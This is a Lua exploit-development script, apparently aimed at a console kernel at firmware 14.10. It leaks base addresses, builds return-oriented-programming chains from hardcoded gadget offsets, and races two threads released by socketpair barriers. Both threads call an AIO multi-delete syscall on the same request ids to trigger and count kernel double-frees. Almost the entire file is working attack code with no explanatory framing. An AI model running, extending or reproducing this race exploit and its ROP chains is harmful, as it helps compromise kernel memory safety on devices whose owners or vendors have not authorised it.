-- CRASH_CLASS: HIGH
-- PROBE 555j: pipe-barrier synchronized dual child race
--
-- 555i barrier didn't work: umtx_wait(op=3) returns 0 immediately.
-- This probe uses read() on a socketpair as the blocking primitive.
-- read() on an empty socket DEFINITELY blocks the thread.
--
-- Phase 1: concurrency test (do children ever run in parallel?)
-- Phase 2: pipe barrier race

print("=== PROBE 555j: PIPE BARRIER RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(b, n) for off = 0, n - 4, 4 do wd(b + off, 0) end end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", N(v))
end

local Z = uint64(0)
local sc3   = mk(3)   -- read
local sc4   = mk(4)   -- write
local sc6   = mk(6)   -- close
local sc20  = mk(20)  -- getpid
local sc135 = mk(135) -- socketpair
local sc331 = mk(331) -- sched_yield
local sc455 = mk(455) -- thr_new
local sc477 = mk(477) -- mmap
local sc669 = mk(669) -- aio_submit
local sc662 = mk(662) -- aio_multi_delete
local sc664 = mk(664) -- aio_multi_poll
local sc666 = mk(666) -- aio_multi_cancel

local pid = N(sc20())
print("pid=" .. pid)

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() mk(593)(Z, info) end)
local eb = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))

zero(info, 0x200); wd(info, 0x160)
pcall(function() mk(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("eb=" .. q(eb) .. " lk=" .. q(lk))

local pop_rax   = eb + uint64(0x992)
local pop_rdi   = eb + uint64(0xC9DFE)
local pop_rsi   = eb + uint64(0xD77D)
local pop_rdx   = eb + uint64(0x3B02D7)
local pop_rcx   = eb + uint64(0xE64)
local mov_m_rax = eb + uint64(0x92C67)
local bare_ret  = eb + uint64(0x42)
local fn_addr   = lk + uint64(0xB57)

-- Shared memory
local ok_sh, shared = pcall(function()
    return sc477(Z, uint64(0x8000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
print("shared=" .. q(shared))
local sn = N(shared)

-- Fake TCB
local ok_tcb, tcb_page = pcall(function()
    return sc477(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
for i = 0, 0x100, 8 do wq(tcb_page + i, tcb_page) end
local tcb_ptr_buf = memory.alloc(8)
wq(tcb_ptr_buf, tcb_page)

-- Stack A + B
local ok_sa, stack_A = pcall(function()
    return sc477(Z, uint64(0x200000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
local ok_sb, stack_B = pcall(function()
    return sc477(Z, uint64(0x200000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
local rsp_A = N(stack_A) + 0x100000 - 8
local rsp_B = N(stack_B) + 0x100000 - 8

-- ============================================================
-- PHASE 1: CONCURRENCY TEST
-- Each child does sysarch → 500x getpid → writes count to shared mem → exit
-- If concurrent: both finish ~same time. If serial: A finishes, then B starts.
-- We measure by checking if A's done and B's done appear close together.
-- ============================================================
print("\n--- CONCURRENCY TEST ---")
local cnt_A_addr = sn + 0x600
local cnt_B_addr = sn + 0x604
local done_cA    = sn + 0x608
local done_cB    = sn + 0x60C

wd(cnt_A_addr, 0); wd(cnt_B_addr, 0)
wd(done_cA, 0); wd(done_cB, 0)

local function build_counter_chain(rsp_val, cnt_ptr, done_ptr, marker, count)
    local pos = 0
    local function emit(v) wq(uint64(rsp_val + pos), v); pos = pos + 8 end

    -- sysarch
    emit(pop_rdi); emit(uint64(129))
    emit(pop_rsi); emit(uint64(N(tcb_ptr_buf)))
    emit(pop_rax); emit(uint64(165))
    emit(fn_addr)

    -- N getpid calls (each takes ~1μs)
    for i = 1, count do
        emit(pop_rax); emit(uint64(20))
        emit(fn_addr)
    end

    -- write marker to done_ptr
    emit(pop_rax); emit(uint64(marker))
    emit(pop_rdi); emit(uint64(done_ptr))
    emit(mov_m_rax)

    -- thr_exit
    emit(pop_rdi); emit(Z)
    emit(pop_rax); emit(uint64(431))
    emit(fn_addr)

    return pos
end

local csz_A = build_counter_chain(rsp_A, cnt_A_addr, done_cA, 0xAAAA, 500)
local csz_B = build_counter_chain(rsp_B, cnt_B_addr, done_cB, 0xBBBB, 500)

local tp_A = memory.alloc(0x40); zero(tp_A, 0x40)
wq(tp_A, bare_ret); wq(tp_A + 0x10, stack_A); wq(tp_A + 0x18, uint64(0x100008))

local tp_B = memory.alloc(0x40); zero(tp_B, 0x40)
wq(tp_B, bare_ret); wq(tp_B + 0x10, stack_B); wq(tp_B + 0x18, uint64(0x100008))

-- Launch both
pcall(function() sc455(uint64(N(tp_A)), uint64(0x38)) end)
pcall(function() sc455(uint64(N(tp_B)), uint64(0x38)) end)

-- Poll: which finishes first? Check 100 times with yield
local first_done = "none"
local second_done = "none"
for check = 1, 200 do
    pcall(function() sc331() end)
    local da = rd(done_cA) or 0
    local db = rd(done_cB) or 0
    if first_done == "none" then
        if da ~= 0 and db ~= 0 then first_done = "BOTH"; second_done = "BOTH"
        elseif da ~= 0 then first_done = "A"
        elseif db ~= 0 then first_done = "B"
        end
    end
    if first_done ~= "none" and second_done == "none" then
        if da ~= 0 and db ~= 0 then second_done = (first_done == "A") and "B" or "A" end
    end
    if da ~= 0 and db ~= 0 then break end
end

print("first_done=" .. first_done .. " second_done=" .. second_done)
print("done_A=" .. string.format("0x%X", rd(done_cA) or 0))
print("done_B=" .. string.format("0x%X", rd(done_cB) or 0))
if first_done == "BOTH" then
    print("*** BOTH finished between same yield — TRUE CONCURRENCY possible ***")
elseif first_done ~= "none" and second_done ~= "none" then
    print("serialized: " .. first_done .. " finished first")
end

-- ============================================================
-- PHASE 2: PIPE BARRIER RACE
-- Create two socketpairs as barriers. Each child reads 1 byte.
-- Main writes 1 byte to each to release simultaneously.
-- ============================================================
print("\n--- PIPE BARRIER RACE ---")

local BATCH = 32
local ROUNDS = 200

local done_A_addr   = sn + 0x000
local done_B_addr   = sn + 0x004
local ids_addr      = sn + 0x010
local errs_A_addr   = sn + 0x200
local errs_B_addr   = sn + 0x400
local read_buf_A    = sn + 0x500
local read_buf_B    = sn + 0x504

-- Reusable buffers
local sv      = memory.alloc(16)
local scratch = memory.alloc(0x1000)
local reqs    = memory.alloc(BATCH * 0x28 + 16)
local ids_tmp = memory.alloc(BATCH * 4 + 16)
local cst     = memory.alloc(BATCH * 4 + 16)
local poll_st = memory.alloc(BATCH * 4 + 16)
local wr_buf  = memory.alloc(8)
wd(wr_buf, 0x4141)  -- "AA"

-- Create barrier socketpairs (AF_UNIX=1, SOCK_STREAM=1)
local bar_sv = memory.alloc(16)
local ok_ba, rv_ba = pcall(function()
    return sc135(uint64(1), uint64(1), Z, uint64(N(bar_sv)))
end)
local bar_A_rd = rd(bar_sv)
local bar_A_wr = rd(bar_sv + 4)

local ok_bb, rv_bb = pcall(function()
    return sc135(uint64(1), uint64(1), Z, uint64(N(bar_sv)))
end)
local bar_B_rd = rd(bar_sv)
local bar_B_wr = rd(bar_sv + 4)

print(string.format("barriers: A(rd=%d,wr=%d) B(rd=%d,wr=%d)",
    bar_A_rd or -1, bar_A_wr or -1, bar_B_rd or -1, bar_B_wr or -1))

local function build_race_chain(rsp_val, barrier_fd, rbuf_ptr, errs_ptr, done_ptr, done_marker)
    local pos = 0
    local function emit(v) wq(uint64(rsp_val + pos), v); pos = pos + 8 end

    -- sysarch(165, 129, &tcb)
    emit(pop_rdi); emit(uint64(129))
    emit(pop_rsi); emit(uint64(N(tcb_ptr_buf)))
    emit(pop_rax); emit(uint64(165))
    emit(fn_addr)

    -- read(barrier_fd, rbuf, 1) — BLOCKS until main writes
    emit(pop_rdi); emit(uint64(barrier_fd))
    emit(pop_rsi); emit(uint64(rbuf_ptr))
    emit(pop_rdx); emit(uint64(1))
    emit(pop_rax); emit(uint64(3))  -- sys_read
    emit(fn_addr)

    -- aio_multi_delete(662)
    emit(pop_rdi); emit(uint64(ids_addr))
    emit(pop_rsi); emit(uint64(BATCH))
    emit(pop_rdx); emit(uint64(errs_ptr))
    emit(pop_rax); emit(uint64(662))
    emit(fn_addr)

    -- done marker
    emit(pop_rax); emit(uint64(done_marker))
    emit(pop_rdi); emit(uint64(done_ptr))
    emit(mov_m_rax)

    -- thr_exit
    emit(pop_rdi); emit(Z)
    emit(pop_rax); emit(uint64(431))
    emit(fn_addr)

    return pos
end

print(string.format("Racing %d rounds, batch=%d (pipe barrier)\n", ROUNDS, BATCH))

local total_wins = 0
local a_clean = 0
local b_clean = 0
local mixed = 0
local timeouts = 0

for round = 1, ROUNDS do
    local fds_r = {}
    local fds_w = {}
    local ok_sp = true
    for i = 1, BATCH do
        local ok, v = pcall(function()
            return sc135(uint64(1), uint64(1), Z, uint64(N(sv)))
        end)
        if ok and N(v) >= 0 then
            fds_r[i] = rd(sv)
            fds_w[i] = rd(sv + 4)
        else
            ok_sp = false; break
        end
    end

    if ok_sp then
        -- Submit AIO
        for i = 0, BATCH - 1 do
            local base = reqs + i * 0x28
            wq(base + 0x00, Z)
            wq(base + 0x08, uint64(0x1000))
            wq(base + 0x10, uint64(N(scratch)))
            wq(base + 0x18, Z)
            wd(base + 0x20, fds_r[i + 1])
            wd(base + 0x24, 0)
        end
        for i = 0, BATCH - 1 do wd(ids_tmp + i * 4, 0) end
        pcall(function()
            sc669(uint64(0x1001), uint64(N(reqs)), uint64(BATCH),
                uint64(3), uint64(N(ids_tmp)))
        end)

        pcall(function()
            sc666(uint64(N(ids_tmp)), uint64(BATCH), uint64(N(cst)))
        end)
        for i = 1, BATCH do
            pcall(function() sc6(uint64(fds_w[i])) end)
        end

        local all_term = false
        for try = 1, 100 do
            pcall(function()
                sc664(uint64(N(ids_tmp)), uint64(BATCH), uint64(N(poll_st)))
            end)
            all_term = true
            for i = 0, BATCH - 1 do
                local s = rd(poll_st + i * 4)
                if not s or s < 3 then all_term = false; break end
            end
            if all_term then break end
        end

        if all_term then
            for i = 0, BATCH - 1 do
                wd(ids_addr + i * 4, rd(ids_tmp + i * 4) or 0)
                wd(errs_A_addr + i * 4, 0x77777777)
                wd(errs_B_addr + i * 4, 0x77777777)
            end
            wd(done_A_addr, 0)
            wd(done_B_addr, 0)

            -- Build chains (must rebuild: barrier fds are fixed but chain uses fixed addresses)
            build_race_chain(rsp_A, bar_A_rd, read_buf_A, errs_A_addr, done_A_addr, 0xAAAA)
            build_race_chain(rsp_B, bar_B_rd, read_buf_B, errs_B_addr, done_B_addr, 0xBBBB)

            -- Launch both children (they'll block on read())
            pcall(function() sc455(uint64(N(tp_A)), uint64(0x38)) end)
            pcall(function() sc455(uint64(N(tp_B)), uint64(0x38)) end)

            -- Yield to let children start and block on read
            for y = 1, 5 do
                pcall(function() sc331() end)
            end

            -- Release BOTH barriers simultaneously (two writes, no yield between)
            pcall(function()
                sc4(uint64(bar_A_wr), uint64(N(wr_buf)), uint64(1))
            end)
            pcall(function()
                sc4(uint64(bar_B_wr), uint64(N(wr_buf)), uint64(1))
            end)

            -- Yield to let children complete
            for y = 1, 30 do
                pcall(function() sc331() end)
                local da = rd(done_A_addr) or 0
                local db = rd(done_B_addr) or 0
                if da ~= 0 and db ~= 0 then break end
            end

            local da_ok = (rd(done_A_addr) or 0) == 0xAAAA
            local db_ok = (rd(done_B_addr) or 0) == 0xBBBB
            if not da_ok or not db_ok then
                timeouts = timeouts + 1
                if timeouts <= 3 then
                    print(string.format("R%d: timeout A=%s(0x%X) B=%s(0x%X)",
                        round, tostring(da_ok), rd(done_A_addr) or 0,
                        tostring(db_ok), rd(done_B_addr) or 0))
                end
            end

            local win_count = 0
            local a_ok = 0
            local b_ok = 0
            for i = 0, BATCH - 1 do
                local ea = rd(errs_A_addr + i * 4) or 0x77777777
                local eb_v = rd(errs_B_addr + i * 4) or 0x77777777
                if ea == 0 and eb_v == 0 then win_count = win_count + 1 end
                if ea == 0 then a_ok = a_ok + 1 end
                if eb_v == 0 then b_ok = b_ok + 1 end
            end

            if win_count > 0 then
                total_wins = total_wins + win_count
                print(string.format("R%d: *** DOUBLE-FREE %d/%d ***", round, win_count, BATCH))
                if total_wins <= 64 then
                    for i = 0, 3 do
                        print(string.format("  [%d] A=0x%X B=0x%X",
                            i, rd(errs_A_addr + i * 4) or 0, rd(errs_B_addr + i * 4) or 0))
                    end
                end
            end

            if a_ok == BATCH then a_clean = a_clean + 1
            elseif b_ok == BATCH then b_clean = b_clean + 1
            elseif a_ok > 0 and b_ok > 0 then mixed = mixed + 1
            end

            if round % 25 == 0 then
                print(string.format("  r=%d w=%d A=%d B=%d mx=%d to=%d",
                    round, total_wins, a_clean, b_clean, mixed, timeouts))
            end
        end

        for i = 1, BATCH do
            pcall(function() sc6(uint64(fds_r[i])) end)
        end
    end
end

-- Cleanup barrier fds
pcall(function() sc6(uint64(bar_A_rd)) end)
pcall(function() sc6(uint64(bar_A_wr)) end)
pcall(function() sc6(uint64(bar_B_rd)) end)
pcall(function() sc6(uint64(bar_B_wr)) end)

print("")
local pid2 = N(sc20())
print(string.format("TOTAL: r=%d wins=%d A=%d B=%d mixed=%d to=%d pid=%d%s",
    ROUNDS, total_wins, a_clean, b_clean, mixed, timeouts, pid2,
    pid2 == pid and " OK" or " CHANGED"))

if total_wins > 0 then
    print(">>> DOUBLE-FREE CONFIRMED ON 14.10 <<<")
elseif mixed > 0 then
    print("interleaving detected (" .. mixed .. " rounds) — race window exists")
else
    local winner = a_clean > b_clean and "A" or "B"
    print("no interleaving — " .. winner .. " always wins")
    if timeouts > ROUNDS / 2 then
        print("high timeouts — children may be stuck on read (fd issue?)")
    end
end
print("=== 555j DONE ===")
